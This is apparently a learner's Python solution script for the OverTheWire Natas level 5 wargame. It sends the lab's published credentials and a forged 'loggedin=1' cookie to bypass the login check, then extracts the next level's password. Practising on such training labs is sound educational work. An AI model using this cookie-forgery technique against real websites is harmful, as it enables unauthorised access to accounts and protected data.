#!/usr/bin/env python

#using requests module for python, not sure if I will need to install anything for this?
import requests
import re

username = 'natas5'
password = 'Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD'
url = 'http://%s.natas.labs.overthewire.org/' % username

print(url) #make sure the URL works fine

#response = requests.get(url, auth = (username, password))
#says we're not logged in...so cookies?
#we can make a legit session then
session = requests.Session()
#response = session.get(url, auth = (username, password))



#print(session.cookies) #shows our cookies
#<RequestsCookieJar[<Cookie loggedin=0 for natas5.natas.labs.overthewire.org/>]>
#cookies also use a dictionary type
cookies = { "loggedin" : "1" }
response = session.get(url, auth = (username, password), cookies = cookies)
#might be useful: https://requests.readthedocs.io/en/latest/user/quickstart/#cookies
content = response.text


######################
#print(content)

print(re.findall('Access granted. The password for natas6 is (.*)</div>', content))